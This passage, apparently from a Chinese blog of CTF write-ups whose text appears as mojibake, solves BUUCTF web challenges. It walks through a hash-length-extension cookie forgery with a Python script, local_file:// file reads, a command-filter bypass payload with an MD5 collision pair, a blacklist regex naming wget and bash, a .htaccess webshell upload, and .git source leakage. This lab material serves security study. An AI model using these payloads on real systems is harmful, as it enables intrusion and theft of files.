class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>é™„å¸¦Hint: flag is in ./flag.txt<br>å®¡è®¡ä¹‹:</p><ol><li>ä¸‰ä¸ªè·¯ç”±,indexç”¨æ¥è·å–æºç ,geneSignç”¨æ¥ç”Ÿæˆmd5,De1taä¸ºæŒ‘æˆ˜.</li><li>åœ¨ /De1ta ä¸­ä½¿ç”¨ get ä¼ å‚ param ,åœ¨ cookie é‡Œç”¨ action sign å»è¯»å– flag.txt,å…¶ä¸­param=flag.txt,action ä¸­è¦å«æœ‰ read å’Œ scan,ä¸” sign=md5(secert_key + param + action)<h3 id="æ–¹æ³•ä¸€-å“ˆå¸Œæ‹“å±•æ”»å‡»"><a href="#æ–¹æ³•ä¸€-å“ˆå¸Œæ‹“å±•æ”»å‡»" class="headerlink" title="æ–¹æ³•ä¸€:å“ˆå¸Œæ‹“å±•æ”»å‡»"></a>æ–¹æ³•ä¸€:å“ˆå¸Œæ‹“å±•æ”»å‡»</h3></li></ol><p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">è¯¦ç»†èµ„æ–™</a></p><p>ç®€å•è¯´ä¸‹md5ç®—æ³•,åˆ†ä¸ºmd5 paddingå’Œmd5 compress</p><figure class="image-box">                <img src="./18.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å¯¹è¾“å…¥çš„ä¸€ä¸²å­—ç¬¦è¿›è¡Œmd5 paddingå,å¦‚æœè¿™ä¸²å­—ç¬¦çš„å­—èŠ‚é•¿åº¦å¯¹64æ±‚ä½™ç»“æœä¸ä¸º56,å°±ä¼šå¡«å……ä¸€ä¸ªx80å’Œxxä¸ª0ä½¿å¾—å¯¹64æ±‚ä½™çš„ç»“æœç­‰äº56,æ­¤æ—¶å­—ç¬¦ä¸²çš„å­—èŠ‚é•¿åº¦ä¸ºn*64+56,å¹¶ä¸”æœ€å8ä¸ªå­—èŠ‚ç”¨æ¥è®°å½•åŸå§‹è¾“å…¥ä¿¡æ¯é•¿åº¦</p><p>ä¾‹å¦‚å¯¹adminè¿›è¡Œmd5 paddingå¤„ç†åä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure><p>61646d696e  ä¸ºadminçš„hex<br>80  ä¸ºç¬¬ä¸€ä¸ªå¡«å……å—,åé¢çš„ä¸€å¤§ä¸²0ä¹Ÿæ˜¯å¡«å……</p><p>2800000000000000  å®é™…å€¼ä¸º0000000000000028,åè¿›åˆ¶çš„40,å•ä½ä¸ºbit,ä¸º5ä¸ªå­—èŠ‚(admin)</p><p>md5ç®—æ³•é‡Œæœ‰å››ä¸ªå‘é‡(Magic number)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–çš„4ä¸ªMagic numberä¼šå’Œç¬¬ä¸€ä¸ª64å­—èŠ‚çš„Message blockè¿›è¡Œmd5 compresså‹ç¼©ç®—æ³•,å‹ç¼©ç®—æ³•å®Œæˆåä¼šäº§ç”Ÿæ–°çš„4ä¸ªMagic number,å†è¿›è¡Œç¬¬äºŒä¸ª64å­—èŠ‚Message blockçš„md5 compresså‹ç¼©ç®—æ³•,ç›´åˆ°å‹ç¼©åˆ°æœ€å64ä¸ªå­—èŠ‚çš„(Message block + padding),æœ€åå¾—åˆ°çš„Magic numberç»è¿‡hexè½¬åŒ–å°±æ˜¯æœ€åçš„md5 hashå€¼<br>æ‰€ä»¥å½“å·²çŸ¥ md5(salt+message)çš„å€¼ messageå†…å®¹ salt+messageé•¿åº¦ æ—¶,å°±å¯ä»¥åœ¨ä¸çŸ¥é“saltçš„å…·ä½“å†…å®¹æƒ…å†µä¸‹è®¡ç®—å‡ºä»»æ„çš„md5(salt+message+padding+append)å€¼,é€†å‘å‡ºæœ€åä¸€æ¬¡çš„4ä¸ªMagic number<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">å¤§ä½¬çš„æ”»å‡»è„šæœ¬</a></p><p>å›å½’æ­£é¢˜</p><p>geneSigné‡Œçš„request.args.get()æ–¹æ³•å¯ä»¥ç”¨æ¥è¯·æ±‚ä¸Šä¸‹æ–‡,å³å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹,å…ˆè¯»å–ä¸€ä¸‹flag.txt,è·å¾—ä¸€ä¸²md5,æ˜¯md5(secert_key + â€˜flag.txtâ€™ + â€˜scanâ€™) çš„å€¼,è€Œæˆ‘ä»¬éœ€è¦çš„æ˜¯è·å– md5(secert_key + â€˜flag.txtâ€™ + â€˜readscanâ€™) çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">62bc8d3947680a751bfb41f9e69631d9</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨hashpumpå·¥å…·è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»<br><figure class="image-box">                <img src="./19.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02093a8c2c49c37477f5053717930316</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨æ‰§è¡Œå‰æŠŠè½¬ä¹‰å­—ç¬¦\xå˜æˆ%ç„¶åå°†è¿™ä¸¤ä¸²ä¼ å…¥cookie,è„šæœ¬å¦‚ä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn/De1ta?param=flag.txt&apos;</span><br><span class="line">cookies = &#123;</span><br><span class="line">Â  &apos;sign&apos;: &apos;02093a8c2c49c37477f5053717930316&apos;,</span><br><span class="line">Â  &apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,</span><br><span class="line">Â  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p><p>æ”¶åˆ°å›å¤ä¿¡æ¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 hashcookie.py</span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;40fac20a-bded-4216-889f-ac089966e6d4&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="æ–¹æ³•äºŒ-å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#æ–¹æ³•äºŒ-å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="æ–¹æ³•äºŒ:å­—ç¬¦ä¸²æ‹¼æ¥"></a>æ–¹æ³•äºŒ:å­—ç¬¦ä¸²æ‹¼æ¥</h3><p>åä¸¤ç§æ–¹æ³•æ˜¯çœ‹å¤§ä½¬åšå®¢çš„,è·Ÿç€å¤ç°å­¦ä¸€æ³¢</p><p>geneSigné‡Œçš„paramåœ¨æ–¹æ³•å®šä¹‰é‡Œåªæœ‰scançš„åŠŸèƒ½,è¦æƒ³å®ç°readscanå¯ä»¥æ ¹æ®pythoné‡Œå¯¹md5()æ–¹æ³•é‡Œå‚æ•°çš„æ‹¼æ¥,é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼,çœ‹ä¸€ä¸‹è¿™ä¸¤å—çš„é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>åœ¨è®¿é—®/geneSign?param=flag.txtçš„æ—¶å€™,è¿”å›çš„æ•°æ®åº”è¯¥æ˜¯ md5(â€˜secert_keyâ€™ + â€˜flag.txtâ€™ + â€˜scanâ€™)<br>åœ¨md5()æ–¹æ³•é‡Œç›¸å½“äº md5(secert_keyflag.txtscan)</p><p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ä¸º /geneSign?param=flag.txtread æ—¶å°±æ‹¼æ¥å‡ºäº†md5(â€˜secert_keyflag.txtreadscanâ€™),ç›´æ¥è·å–åˆ°cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">cb6a31cfc19b4162449c235bac8251b7</span><br></pre></td></tr></table></figure><p>æ¥ç€æŠ“åŒ…è®¿é—® /De1ta?param=flag.txt æ„é€ cookie<br>action=readscan;sign=cb6a31cfc19b4162449c235bac8251b7</p><figure class="image-box">                <img src="./20.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{40fac20a-bded-4216-889f-ac089966e6d4}</p><h3 id="æ–¹æ³•ä¸‰-local-file"><a href="#æ–¹æ³•ä¸‰-local-file" class="headerlink" title="æ–¹æ³•ä¸‰:local_file"></a>æ–¹æ³•ä¸‰:local_file</h3><p>å’Œç¬¬äºŒç§æ–¹æ³•ç±»ä¼¼,ä½†åœ¨æ–‡ä»¶å†…å®¹è¯»å–ä¸Šç”¨äº†local_fileå‡½æ•°,ä¸ä¹‹ç›¸å…³çš„æ˜¯CVE-2019-9948,å­˜åœ¨ä¸å¿…è¦çš„URLæ–¹æ¡ˆä»¥å…è®¸local_file://è¯»å–urllibä¸­çš„æ–‡ä»¶</p><p>è¿›è¡Œè¯»å–çš„è¯,flag.txtçš„è·¯å¾„æ˜¯ local_file:///app/flag.txt,å…¶ä½™æ­¥éª¤ä¸æ–¹æ³•äºŒç›¸ä¼¼</p><p>è¿™é‡Œæ˜¯ä½¿ç”¨çš„ urllib.urlopen(param) å»åŒ…å«çš„æ–‡ä»¶,æ‰€ä»¥å¯ä»¥ç›´æ¥åŠ ä¸Šæ–‡ä»¶è·¯å¾„ flag.txt æˆ– ./flag.txt å»è®¿é—®,ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ file:///app/flag.txt å»è®¿é—®,ä½†æ˜¯ file å…³é”®å­—åœ¨é»‘åå•é‡Œ,å¯ä»¥ä½¿ç”¨ local_file ä»£æ›¿,â€‹ å¦‚æœä½¿ç”¨ urllib2.urlopen(param) å»åŒ…å«æ–‡ä»¶å°±å¿…é¡»åŠ ä¸Š file ,å¦åˆ™ä¼šæŠ¥ ValueError: unknown url type: /path/to/file çš„é”™è¯¯.</p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">http://0</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">e8b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">ac</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">5e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">a39d</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-418</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">f-9</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">6e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-52</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">7</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">96</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">c</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">2ba0b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">.node3.buuoj.cn</a></p><p>æŸ¥çœ‹æºç ,æœ‰ä¸€å¥æç¤º md5 is funny ~</p><p>è§‚å¯Ÿurlçš„å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line">å¯¹imgè¿›è¡Œbase64è§£ç </span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">å†è§£ä¸€æ¬¡</span><br><span class="line">3535352e706e67</span><br><span class="line">è§£ä¸€æ¬¡hex</span><br><span class="line">555.png</span><br></pre></td></tr></table></figure><p>çŒœæµ‹èƒ½è¿›è¡Œæ–‡ä»¶è¯»å–,æ„é€ index.phpæŸ¥ä¸‹æºç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure></p><p>å¯¹å›¾ç‰‡é‡Œçš„base64è¿›è¡Œè§£å¯†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]))Â </span><br><span class="line">Â  Â  header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">Â  Â  <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  $txt = base64_encode(file_get_contents($file));</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$imgå¯¹æ–‡ä»¶è¿›è¡Œbase64æºç è¯»å–</span></span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//å¯¹$cmdè¿›è¡Œäº†è¿‡æ»¤,ä½†è¿‡æ»¤åæ–œæ  |\\|\\\\| æ­£åˆ™æ²¡æœ‰å†™å¥½,å¯å¯¼è‡´åæ–œæ é€ƒé€¸</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="comment">//md5å¼ºç±»å‹æ¯”è¾ƒ,éœ€è¦md5ç¢°æ’</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">Â  body&#123;</span><br><span class="line">Â  Â background:url(./bj.png)Â  no-repeat center center;</span><br><span class="line">Â  Â background-size:cover;</span><br><span class="line">Â  Â background-attachment:fixed;</span><br><span class="line">Â  Â background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>å¯¹äºæœ¬é¢˜phpåæ–œæ çš„æ­£åˆ™ |\|\\| å½¢æˆçš„åæ–œæ é€ƒé€¸,å¯ä»¥è§£æä¸€ä¸‹è¿‡ç¨‹</p><ol><li>\ å…ˆç»è¿‡PHPæ­£åˆ™è§£æå™¨ä¸ºä¸€ä¸ª\</li><li>\ åˆè·Ÿâ€™|â€™ç»“åˆåˆ°ä¸€èµ·,ä»è€Œåœ¨æ­£åˆ™è¡¨è¾¾å¼çš„è§£æå™¨è§£æä¸º|</li><li>åˆå› ä¸ºâ€™|â€™æ˜¯æ­£åˆ™ä¸­çš„ä¿ç•™ç¬¦å·,æ‰€ä»¥éœ€è¦ä¸€ä¸ªè½¬ä¹‰ç¬¦æ¥è½¬ä¹‰.æ‰€ä»¥\|è¿™ä¸ªçš„ç»“æœå°±æ˜¯åŒ¹é… â€˜|â€™</li><li>åé¢åˆè·Ÿäº†\\,è¿™é‡Œå…ˆç»è¿‡PHPæ­£åˆ™è§£æå™¨ä¸º \,ç„¶ååœ¨ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„è§£æå™¨ä¸º â€˜\â€™</li><li>æœ€åçš„æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯åŒ¹é…â€™|\â€™è€Œä¸æ˜¯â€™|â€™å’Œâ€™\â€™,å½¢æˆåæ–œæ é€ƒé€¸</li></ol><p>æ ¹æ®åˆ†ææ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%20/flag</span><br></pre></td></tr></table></figure><p>åœ¨md5é‡Œæœ‰ä¸€äº›md5ä¸²ç¼–ç ä¸åŒä½†å€¼ç›¸åŒ,å°±å¯ä»¥ç”¨æ¥ç¢°æ’ç»•è¿‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p><p>éœ€è¦æŠ“åŒ…æ”¹æˆpostä¼ å‚<br><figure class="image-box">                <img src="./21.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p><p>flag{5e4e259d-460a-4ca9-ab42-9641bf7f9179}</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><a href="http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn" target="_blank" rel="noopener">http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn</a></p><p>å°è¯•ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡é©¬,æç¤ºè¯´åç¼€åä¸èƒ½æœ‰ph</p><figure class="image-box">                <img src="./22.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>é‚£å°±ä¸Šä¼ .htaccess</p><figure class="image-box">                <img src="./23.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å†æŠŠå›¾ç‰‡ä¸Šä¼ </p><figure class="image-box">                <img src="./24.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>èšå‰‘è¿ä¸Š</p><figure class="image-box">                <img src="./25.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{4d82a478-0cbd-41f0-ab29-ae2d943d8705}</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><a href="http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn" target="_blank" rel="noopener">http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn</a></p><p>é¡µé¢æ²¡å•¥åˆ©ç”¨ç‚¹,æˆ‘çš„æ‰«æå™¨ç»å¸¸æ‰«ä¸åˆ°.git,è¿˜æ˜¯ç”¨è‡ªå·±çš„è„šæœ¬æ‰«ä¸‹ç›®å½•</p><figure class="image-box">                <img src="./26.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ä¸€å †å¼±ç›¸åº”,ä½†å­˜åœ¨.git,ç”¨githackæ¢å¤,çœ‹åˆ°æœ‰flag.phpæ–‡ä»¶,ä½†æ²¡æ¢å¤å‡ºæ¥</p><figure class="image-box">                <img src="./27.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ä»¥å‰åšé¢˜å¥½åƒä¹Ÿæœ‰è¿™ç§æƒ…å†µ,ç¿»äº†ç¿»ä»¥å‰çš„<a href="http://www.damyahome.top/8307%E5%92%8C8302%E9%9D%B6%E5%9C%BAweb%E9%A2%98wp/" target="_blank" rel="noopener">æ–‡ç« </a></p><p>å°è¯•ç”¨gittoolå·¥å…·é‡Œçš„Dumperå’ŒExtractorè·å¾—å®Œæ•´æºç ,å¤±è´¥</p><p>å¥‡æ€ªäº†å°±æ˜¯æ¢å¤ä¸è¿‡æ¥,æˆ‘æ¢é¶æœºä¹Ÿæ¢å¤ä¸è¿‡æ¥,åªèƒ½çœ‹ç€åˆ«äººåšå®¢çš„æºç </p><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"><span class="comment">//flag.phpåªèµ·åˆ°ä¸€ä¸ªè¾“å‡ºä½œç”¨</span></span><br></pre></td></tr></table></figure><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//htmlç•¥</span></span><br><span class="line"><span 